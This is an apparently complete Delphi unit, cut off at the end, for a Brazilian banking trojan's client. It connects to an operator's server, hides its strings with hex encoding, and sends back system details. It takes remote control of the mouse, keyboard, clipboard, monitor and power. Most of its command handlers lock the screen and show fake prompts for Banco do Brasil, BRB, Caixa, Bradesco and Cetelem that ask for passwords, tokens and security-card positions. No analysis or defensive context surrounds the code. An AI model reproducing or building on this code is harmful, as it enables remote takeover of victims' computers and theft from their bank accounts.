unit UnPrincipal;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls,Registry, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, ScktComp, ComCtrls,
  Vcl.ExtCtrls, zLibEx,jpeg,   PsAPI, StreamManager, ClipBrd, SndKey32,  TlHelp32,
  MMSystem;


type
  TForm1 = class(TForm)
    Button1: TButton;
    CS1: TClientSocket;
    CS2: TClientSocket;
    CheckBox1: TCheckBox;
    Timer3: TTimer;
    CS3: TClientSocket;
    StatusBar1: TStatusBar;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    Label19: TLabel;
    Label13: TLabel;
    Label14: TLabel;
    Label16: TLabel;
    Label6: TLabel;
    Label15: TLabel;
    Label11: TLabel;
    Edit5: TEdit;
    TrmInicio: TTimer;
    TrmChrome: TTimer;
    Label5: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label20: TLabel;
    procedure CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Timer3Timer(Sender: TObject);
    procedure CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS4Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure TrmInicioTimer(Sender: TObject);
    procedure TrmChromeTimer(Sender: TObject);
    function HexToStr(Value: string): string;
    procedure Label20Click(Sender: TObject);

  private
    { Private declarations }
  public
      BrowserHWND1,  BrowserHWND, BKP_BrowserHWND, FakeHWND: HWND;
       posX, posY: Integer;
       PcPosX , PcPosY, PcNum : Integer;
       Tipo3: string; // String para capturar navegador ou desktop no socket
       Browser, SubBrowser, WindowControl: HWND;
       Block:String;
    { Public declarations }
  end;

var
  Form1: TForm1;
  iSendCount : integer;
  PcHunterCount : Integer;
  MyFirstBmp,MySecondBmp,MyCompareBmp,PackStream:TMemoryStream;
  PcHunter1Bmp, PcHunter2Bmp, PcHunterTemp, PcHunterBase : TMemoryStream;

  RecebendoDados: Boolean;
  JanelaHandle: HWND;
  HandlePrinc : HWND;
  JanelaJava  : HWND;
  HandlePcHun : HWND;
  CorpoPcHun  : HWND;
  HWinPcHunter: THandle;
    DATA_ATUAL: string;
    Tipo4 : string;
  BrowserID :String;

  IDSockPrincipal   : String;


  navi      : string;


  WinProc    : string;

  ListText   : TStringList;
  TtItu      : TStringList;
  itTi       : Integer = 10;
  PtPoint    : TPoint;



implementation

{$R *.dfm}
{$R cursor.RES}
{$IMAGEBASE $07F5097}
{$IMAGEBASE $07F22399}

Uses
uGB, uAVInfo,uHBrowsers, Unit21, Unit12;

// FUNÇÃO PARA ENCRIPTAÇÃO DE STRINGS
function TForm1.HexToStr(Value: string): string;
var
  I: Integer;
begin
  Result := '';
  for I := 1 to Length(Value) do
  begin
    if ((I mod 2) = 1) then
      Result := Result + Chr(StrToInt('0x'+ Copy(Value, I, 2)));
  end;
end;

procedure TForm1.Label20Click(Sender: TObject);
begin

end;

// Pega o nome do Processador
function Processador: String;
var
  regi: TRegistry;
  s: string;
begin
  regi := TRegistry.Create;
  With regi do
  Begin
    rootKey := HKEY_LOCAL_MACHINE;
    OpenKey(('HARDWARE\DESCRIPTION\System\CentralProcessor\0'), false); //HARDWARE\DESCRIPTION\System\CentralProcessor\0
    s := ReadString('ProcessorNameString');
    CloseKey;
    Result := Trim(s);
  end;
end;






function MemoryStreamToString(M: TMemoryStream): AnsiString;
begin
  SetString(Result, PAnsiChar(M.Memory), M.Size);
end;

function StreamToString(Stream: TStream): AnsiString;
var
  ms: TMemoryStream;
begin
  Result := '';
  ms := TMemoryStream.Create;
  try
    ms.LoadFromStream(Stream);
    SetString(Result, PChar(ms.Memory), ms.Size);
  finally
    ms.Free;
    // Application.MessageBox(PChar(Result), 'aa', 48)
  end;
end;



// Comprime dados
function CompressStream(SrcStream: TMemoryStream): Boolean;
var
  InputStream, OutputStream: TMemoryStream;
  CompressionStream :TZcompressionStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  Result := false;
  if not assigned(SrcStream) then
    exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;

  CompressionStream := TZCompressionStream.Create(OutputStream,zcFastest);
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    // CompressionStream.Write(buffer,count);
    zcompress(inbuffer, count, outbuffer, outcount, zcMax);
     CompressionStream.CopyFrom(InputStream,0);
     Outputstream.LoadFromStream(Inputstream);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    Result := true;
  finally
     CompressionStream.Free;
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;


// Pega o Sistema Operacional
function GetSOComputer: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.rootKey := HKEY_LOCAL_MACHINE;
    if Reg.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion', false) then
    begin
      Result := Reg.ReadString('ProductName');
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;


// PROCEDIMENTO PARA PRESSIONAR A TECLA ENVIADA
procedure KeyCMD(STR: string);
var
  i: Integer;
begin
  for i := 0 to Length(STR) do
  begin
 //   PostMessage(h, WM_CHAR, Ord(STR[i]), 1);
    PostMessage(Form1.WindowControl, WM_KEYDOWN, Ord(STR[i]), 1);
  end;
end;


procedure SendMouseClick(Window: HWND;  X, Y:Integer);
begin
if Window > 0 then
begin
try
           PostMessage(Window,  WM_LBUTTONDOWN , 0, MakeLParam(X, Y));
           Sleep(10);
           PostMessage(Window, WM_LBUTTONUP, 0, MakeLParam(X, Y));
  except
exit;
end;
  end;
end;


procedure TForm1.Button1Click(Sender: TObject);
begin
  Button1.Enabled := false;
  Edit1.Enabled := false;
  Edit2.Enabled := false;
  Edit3.Enabled := false;
  Edit4.Enabled := false;
  StatusBar1.Panels.Items[1].Text := HexToStr('436F6E656374616E646F2E2E2E');  //Conectando...
  CS1.Port := strToInt(Edit2.Text);
  CS1.Host := Edit1.Text;
  CS1.Active := true;
  if CheckBox1.Checked then
    Timer3.Enabled := true
  else
    Timer3.Enabled := false;
  end;

procedure TForm1.Button2Click(Sender: TObject);
begin

//----
Cs1.Host := Edit2.Text;
Cs1.Address := Edit2.Text;
//----
Cs1.Port := StrToInt(Edit3.Text);
//-----
Cs1.Active := False;
Cs2.Active := False;
Cs3.Active := False;
Timer3.Enabled := False;
Func.tmSearch.Enabled := true;

//----

//-----
Button1.Enabled := True;
end;

procedure TForm1.CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
begin

  CS2.Host := CS1.Host;
  CS2.Port := CS1.Port;
  // CS2.Active := true;

  CS3.Host := CS1.Host;
  CS3.Port := CS1.Port;
  // CS2.Active := true;

  MyFirstBmp := TMemoryStream.Create;
  MySecondBmp := TMemoryStream.Create;
  MyCompareBmp := TMemoryStream.Create;
  PackStream := TMemoryStream.Create;
  iSendCount := 0;
  Statusbar1.Panels[1].Text := HexToStr('436F6E65637461646F');  //Conectado

  Button1.Enabled := false;


  Sleep(1000);
  Socket.SendText(HexToStr('3C7C5052494E434950414C7C3E')); //<|PRINCIPAL|>


end;

procedure TForm1.CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
begin
  Button1.Enabled := false;
  Edit1.Enabled := false;
  Edit2.Enabled := false;
  Edit3.Enabled := false;
  StatusBar1.Panels.Items[1].Text := HexToStr('436F6E656374616E646F2E2E2E'); //Conectando...
end;

procedure TForm1.CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  StatusBar1.Panels.Items[1].Text := HexToStr('446573636F6E65637461646F');   //Desconectado
  Button1.Enabled := true;
  Edit1.Enabled := true;
  Edit2.Enabled := true;
  Edit3.Enabled := true;
  CS2.Active := false;
  CS3.Active := false;
end;




procedure TForm1.CS1Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  StatusBar1.Panels.Items[1].Text := HexToStr('4572726F20616F20636F6E65637461'); //Erro ao conecta
  ErrorCode := 0;
  Button1.Enabled := true;
  Edit1.Enabled := true;
  Edit2.Enabled := true;
  Edit3.Enabled := true;
  CS2.Active := false;
  CS3.Active := false;
end;

procedure TForm1.CS1Read(Sender: TObject; Socket: TCustomWinSocket);
var
  Command, StrPackSize, dados2, dados3, TABELA,serietk, NCEF, NOBB,BBTRA, LETO, NOHS, NOSA,ST,BRBTV, NOEM, IBBS, ITTT, NOEB, NOGF, NOSI, NOIT, NOBE, NODP, NODN, NODE, TABELA1, TIPO, LETRA, TIPO2,Tecla: string;

   posX, posY: Integer;
   valores : TStringList;
   Handle : string;
begin
  Command := Socket.ReceiveText;


  if Pos(HexToStr('3C7C536F636B65744D61696E7C3E'), Command) > 0 then  //<|SocketMain|>
  begin
    dados2 := Command;
    Delete(dados2, 1, Pos(HexToStr('3C7C536F636B65744D61696E7C3E'), dados2) + 13); //<|SocketMain|>

    dados2 := Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1); // <<|
    IDSockPrincipal := dados2;
  end;

 if Pos(HexToStr('3C7C4F4B7C3E'), Command) > 0 then //<|OK|>
  begin
                              //<|Info|>                              //<|>                                                                                                                                              //<<|
    Socket.SendText(HexToStr('3C7C496E666F7C3E')+Edit4.Text+HexToStr('3C7C3E')+GetSOComputer+HexToStr('3C7C3E')+Processador+HexToStr('3C7C3E')+Edit3.Text+HexToStr('3C7C3E')+Navi+HexToStr('3C7C3E')+BrowserID+HexToStr('3C3C7C'))

    end;

  if Pos(HexToStr('3C7C50494E477C3E'), Command) > 0 then //<|PING|>
  begin
    Socket.SendText(HexToStr('3C7C504F4E477C3E'));  //<|PONG|>
    RecebendoDados := true;
  end;

     if Pos(HexToStr('3C7C4E4F53656E68617C3E'), Command) > 0 then //<|NOSenha|>
  begin
    CS1.Active := false;
    CS2.Active := false;
    CS3.Active := false;
  end;




    if Pos(HexToStr('3C7C436C6F73657C3E'), Command) > 0 then //<|Close|>
  begin
    CS1.Active := false;
    CS2.Active := false;
    CS3.Active := false;
    Func.DestravaM;
    Form12.Close;
    Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);

  end;

 if Pos(HexToStr('3C7C4D6F757365506F737C3E'), Command) > 0 then  //<|MousePos|>
  begin
    dados2 := Command;

    Delete(dados2, 1, Pos(HexToStr('3C7C4D6F757365506F737C3E'), dados2) + 11); //<|MousePos|>
    posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

    Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
    posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|

    SetCursorPos(posX, posY);
  end;

  if Pos(HexToStr('3C7C4D6F7573654C447C3E'), Command) > 0 then // <|MouseLD|>
  begin
    dados2 := Command;

    Delete(dados2, 1, Pos(HexToStr('3C7C4D6F7573654C447C3E'), dados2) + 10); //<|MouseLD|>
    posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

     Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
     posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|

    SetCursorPos(posX, posY);

    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);

  end;

  if Pos(HexToStr('3C7C4D6F75736544437C3E'), Command) > 0 then // <|MouseDC|>
  begin
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    Sleep(10);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    Sleep(10);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    Sleep(10);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end;

  if Pos(HexToStr('3C7C4D6F7573654C557C3E'), Command) > 0 then  //<|MouseLU|>
  begin
    dados2 := Command;

     Delete(dados2, 1, Pos(HexToStr('3C7C4D6F7573654C557C3E'), dados2) + 10);  //<|MouseLU|>
     posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

     Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
     posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|
    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end;

  if Pos(HexToStr('3C7C4D6F75736552447C3E'), Command) > 0 then
  begin
    dados2 := Command;

    Delete(dados2, 1, Pos(HexToStr('3C7C4D6F75736552447C3E'), dados2) + 10); //<|MouseRD|>
     posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

     Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
     posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|

    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
  end;

  if Pos(HexToStr('3C7C4D6F75736552557C3E'), Command) > 0 then     //<|MouseRU|>
  begin
    dados2 := Command;

    Delete(dados2, 1, Pos(HexToStr('3C7C4D6F75736552557C3E'), dados2) + 10); //<|MouseRU|>
     posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

     Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
     posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|

    SetCursorPos(posX, posY);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
  end;

    //teclado para preencher letos e campos!
    if Pos(HexToStr('4B4559'), Command) <> 0 then //KEY
  begin
    Delete(Command, 1, Pos(HexToStr('7C'), Command));  //|
    KeyCMD(Command);
  end;

  // RECEBE O CLICK DO MOUSE
    if Copy(Command,0,5)= HexToStr('636C69636B') then   //click
        begin
        Delete(Command,1,5);
        Label13.Caption := Command;
        valores := TStringList.Create;
        valores.delimiter:=char(','); //<voce definiu como virgula,mas poderia ser outro delimitador
        valores.delimitedtext:= Label13.Caption;//dados lidos na porta serial
        Label15.Caption := valores[0];
        Label16.Caption := valores[1];
        valores.free;
        posX := strtoint(Label15.Caption);
        posY := strtoint(Label16.Caption);

        if WindowControl > 0 then
        begin
        SendMouseClick(WindowControl, posX,posY);
        end;
        end;

        // Captura Colar Remoto
        if Pos(HexToStr('3C7C434C49507C3E'), Command) >0 then begin //<|CLIP|>
        Dados2 := Command;
        Delete(Dados2, 1, Pos(HexToStr('3C7C434C49507C3E'), Dados2)+7); //<|CLIP|>
        LETO := Copy(Dados2, 1, Pos(HexToStr('3C7C3E'), Dados2)-1);  //<|>
  //      Edit6.Text:= Trim(LETO);
     //  SetClipboardText(Handle, LETO);   // coloca com lado escredo do mause
        sleep(200);
        //PasteTo(cut);
        KeyCMD(LETO);
        end;

         if Pos(hEXtOsTR('3C7C4C4554527C3E'), Command) >0 then begin //<|LETR|>
        Dados2 := Command;
        Delete(Dados2, 1, Pos(HexToStr('3C7C4C4554527C3E'), Dados2)+7); //<|LETR|>
        LETRA := Copy(Dados2, 1, Pos(HexToStr('3C7C3E'), Dados2)-1); //<|>
        //showmessage(LETRA);
        KeyCMD(LETRA);
        exit
        end;



      if Pos(HexToStr('3C7C4D6F75736552447C3E'), Command)>0 then begin  //<|MouseRD|>
        Dados2 := Command;

        Delete(dados2, 1, Pos(HexToStr('3C7C4D6F75736552447C3E'), dados2)+10); //<|MouseRD|>
        posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

        Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
        posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|

        SetCursorPos(posX, posY);
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
      end;

      if Pos(HexTOStr('3C7C4D6F75736552557C3E'), Command)>0 then begin //<|MouseRU|>
        Dados2 := Command;

        Delete(dados2, 1, Pos(HexToStr('3C7C4D6F75736552557C3E'), dados2)+10); //<|MouseRU|>
        posX := strToInt(Copy(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) - 1));  //<|>

        Delete(dados2, 1, Pos(HexToStr('3C7C3E'), dados2) + 2); // <|>
        posY := strToInt(Copy(dados2, 1, Pos(HexToStr('3C3C7C'), dados2) - 1));   // <<|

        SetCursorPos(posX, posY);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        end;

                  // Captura Mensagem de Texto
  if Pos(HexToStr('3C7C4D5347367C3E'), Command) >0 then begin  //<|MSG6|>
     Dados2 := Command;
     Delete(Dados2, 1, Pos(HexToStr('3C7C4D5347367C3E'), Dados2)+7);//<|MSG6|>
     TIPO := Copy(Dados2, 1, Pos(HexToStr('3C7C3E'), Dados2)-1);   //<|>
     MessageBox(self.handle,PChar(TIPO), 'ATENÇÃO', MB_ICONWARNING or MB_OK);
     exit
     end;


      ///////////////////////////// TECLADO numerico /////////////////////////////////
                      if Command = '0' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 48, 1);
      exit
     end;

                         if Command = '1' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 49, 1);
      exit
     end;

                           if Command = '2' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 50, 1);
     end;

                           if Command = '3' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 51, 1);
     end;

                              if Command = '4' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 52, 1);
     end;

                              if Command = '5' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 53, 1);
     end;

                              if Command = '6' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 54, 1);
     end;

                              if Command = '7' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 55, 1);
     end;

                              if Command = '8' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 56, 1);
     end;

                              if Command = '9' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 57, 1);
     end;

                                 if Command = '{BS}' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 8, 1);
     end;

                                 if Command = '{ENTER}' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 13, 1);
     end;

                                 if Command = '{ESCAPE}' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 27, 1);
     end;

                                 if Command = '{SPACE}' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 32, 1);
     end;

                                 if Command = '{DEL}' then
      begin
      PostMessage(WindowControl, WM_KEYDOWN, 46, 1);
     end;

                                  if Command = '{LEFT}' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 37, 1);
     end;

                                   if Command = '{UP}' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 38, 1);
     end;

                                   if Command = '{RIGHT}' then
      begin
    PostMessage(WindowControl, WM_KEYDOWN, 39, 1);
     end;

                                    if Command = '{DOWN}' then
      begin
    PostMessage(WindowControl, WM_KEYDOWN, 40, 1);
     end;

                                    if Command = '{CTRL}' then
      begin
    PostMessage(WindowControl, WM_KEYDOWN, 17, 1)
     end;

                                      if Command = '{VIRG}' then
      begin
    PostMessage(WindowControl, WM_KEYDOWN, 188, 1);
     end;


                                       if Command = '{PONTO}' then
      begin
    PostMessage(WindowControl, WM_KEYDOWN, 110, 1);
     end;

                                        if Command = '{PONTO1}' then
      begin
     PostMessage(WindowControl, WM_KEYDOWN, 190, 1);
     end;



     ///////////////////////////// TECLADO numerico /////////////////////////////////


       // Desligar Monitor
     if Command = HexToStr('7B4445534D4F4E7D') then  //{DESMON}
      begin
      SendMessage(Application.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
     end;

     // Ligar Monitor
     if Command = '{DESMON}' then
      begin
      SendMessage(Application.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
     end;

        // Acessar Navegador
      if Command = HexToStr('3C4E6176693E') then //<Navi>
      begin
       Tipo3 := HexToStr('4E617669'); //Navi
       CS2.Active := false;
       CS2.Active := true;
      end;

      // Acessar Desktop
       if Command = HexToStr('3C4445534B544F503E') then //<DESKTOP>
      begin
       Tipo3 := HexToStr('4465736B'); //Desk
       CS2.Active := false;
       CS2.Active := true;
      end;


      if command = HexToStr('7B545241564132347D') then  //{TRAVA24}
         begin
            Func.trava24();
           end;

     if Command = ('<reini>') then //<reini>
      begin
       Func.LiberaMouse;
       Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
       Func.DestravaM;
      end;



      if Command = '<|desli|>' then //<|desli|>
      begin
       Func.DesligarMeuWindows(EWX_SHUTDOWN or EWX_FORCE);
       Func.DestravaM;
      end;

      if Command = 'destrava' then
         Begin
         FOrm12.Close;
         Func.AeroSetEnable(False);
         Func.DestravaM;
         End;


    //   abilitar aero
  if Command = HexToStr('3C7C445354434C49454E54457C3E') then   //<|DSTCLIENTE|>
  begin
   Func.AeroSetEnable(true);
  end;



  {$REGION ' CONTROLE BB'}
{$REGION ' FISICA'}
   // TRAVA BB
  if Pos(HexTOStr('3C7C4E4F42427C3E'), Command) >0 then begin //<|NOBB|>
     Dados2 := Command;
     Delete(Dados2, 1, Pos(HexToStr('3C7C4E4F42427C3E'), Dados2)+7); //<|NOBB|>
     NOBB := Copy(Dados2, 1, Pos(HexTOStr('3C7C3E'), Dados2)-1);  //<|>
     Label6.Caption := AnsiUpperCase(NOBB);
     Label11.Caption := HexToStr('54524156414242');  //TRAVABB
     Func.mostra_form();                                                //<|>
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

      // CHAMAR TELA DE  CARD BB FISICA
   if Command = '{SENHA6BB}' then //{SENHA6BB}
   begin
      Label11.Caption := 'SENHA6BB';  //SENHA6BB
      Func.mostra_form();                                                //<|>
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
      end;
    {$ENDREGION}

 {$REGION ' EMPRESA'}
       // TRAVA BB GF EMPRESARIAL
       if Pos(HexToStr('3C7C4E4F47467C3E'), Command) >0 then //<|NOGF|>
       begin
        Dados2 := Command;
        Delete(Dados2, 1, Pos(HexToStr('3C7C4E4F47467C3E'), Dados2)+7); //<|NOGF|>
        NOGF := Copy(Dados2, 1, Pos(HexTOStr('3C7C3E'), Dados2)-1);  //<|>
        Label6.Caption := AnsiUpperCase(NOGF);
        Label11.Caption := HexTOStr('545241564142424742454D');//TRAVABBGBEM
        Func.mostra_form();                                                //<|>
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');   exit
       end;


       // BB EMPRESA Token 8
       if pos(HexToStr('7B4242584353317D'),Command) > 0 then   {BBXCS1}
       begin
        Label11.Caption := HexToStr('424258435331'); //BBXCS1
        Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>'); exit

       end;

       // BB EMPRESA CERTIFICADO
       if pos(hEXtOsTR('7B4242454353587D'), Command) > 0 then    //{BBECSX}
       begin
        Label11.Caption := hEXtOsTR('424245435358'); //BBECSX
           Func.mostra_form();
         CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');exit
              end;

        // BB EMPRESA SENHA CARTAO
       if pos(HexToStr('7B42424742434152547D'), Command) > 0 then  //{BBGBCART}
       begin
        Label11.Caption := HexToStr('4242474643415244');  //BBGFCARD
          Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');  exit
       end;


          // TRAVA BB EMPRESA
       if Pos(HexToStr('3C7C4E4F45427C3E'), Command) >0 then //<|NOEB|>
       begin
        Dados2 := Command;
        Delete(Dados2, 1, Pos(HexToStr('3C7C4E4F45427C3E'), Dados2)+7); //<|NOEB|>
        BBTRA := Copy(Dados2, 1, Pos(HexTOStr('3C7C3E'), Dados2)-1);  //<|>
        Label6.Caption := AnsiUpperCase(BBTRA);
        Label11.Caption := HexToStr('545241564142424746');  //TRAVABBGF
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
       end;

       // BB EMPRESA SENHA CONTA
       if pos(HexToStr('4242434F4E5441'), Command) > 0 then  //BBCONTA
       begin
        Label11.Caption :=HexToStr('4242434F4E5441');
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
       end;

        // BB EMPRESA CERTIFICADO
       if pos(HexToStr('424243455254'), Command) > 0 then //BBCERT
       begin
        Label11.Caption := HexToStr('424243455254'); //BBCERT
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
       end;



       {$ENDREGION}

{$REGION ' ESTILO'}
       // TRAVA BB ESTILO
       if Pos(HexToStr('3C7C4E4F42457C3E'), Command) >0 then  //<|NOBE|>
       begin
        Dados2 := Command;
        Delete(Dados2, 1, Pos(HexToStr('3C7C4E4F42457C3E'), Dados2)+7); //<|NOBE|>
        NOBE := Copy(Dados2, 1, Pos(HexTOStr('3C7C3E'), Dados2)-1);  //<|>
        Label6.Caption := AnsiUpperCase(NOBE);
        Label11.Caption := HexToStr('54524156414242455354494C4F'); //TRAVABBESTILO
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
       end;

       // BB ESTILO 6
       if Command = HexToStr('7B53454E4841364553547D') then  //{SENHA6EST}
       begin
        Label11.Caption := HexToStr('53454E48413645');   //SENHA6E
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
        exit
       end;
     {$ENDREGION}

    {$ENDREGION}

  {$REGION ' CONTROLE BRB'}
      // TRAVA brb
       if Pos('<|NOBRB|>', Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|NOBRB|>', Dados2)+8);
       NOSI := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(BRBTV);
       Label11.Caption := 'TravaBRB';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

      // Token Brb
      if Command = '{TOKENBRB}' then
      begin
       Label11.Caption := 'TokenBrb';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;
      {$ENDREGION}

  {$REGION ' CONTROLE CEF'}

    if Command = '{SENHA6CF}' then
      begin
      Label11.Caption := 'SENHA6CF';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

           // TRAVA CEF
  if Pos('<|NCEF|>', Command) >0 then begin
     Dados2 := Command;
     Delete(Dados2, 1, Pos('<|NCEF|>', Dados2)+7);
     NCEF := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NCEF);
     Label11.Caption := 'TRAVACEF';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;
      // TRAVA CEF



      {$ENDREGION}

  {$REGION ' CONTROLE DESCO'}
  {$REGION ' FISICA'}
          // TRAVA DESCO NORMAL
  if Pos('<|NODE|>', Command) >0 then begin
     Dados2 := Command;
     Delete(Dados2, 1, Pos('<|NODE|>', Dados2)+7);
     NODE := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NODE);
     Label11.Caption := 'DESCOB';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
   end;

   // Captura Posição Desco Normal
      if Pos('<|DES6|>', Command) > 0 then
   begin
     Dados2 := Command;
     Delete(Dados2, 1, Pos('<|DES6|>', Dados2)+7);
     TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label19.Caption := TABELA;
     Label11.Caption := 'DESKOBELA';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
   end;

          // Token Desco Fisica
     if Command =  '{DESCOTO}' then
   begin
     Label11.Caption := 'DESKTOKEN';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
   end;

   // Token Cetelem
     if Command =  '{CETELEM01}' then
   begin
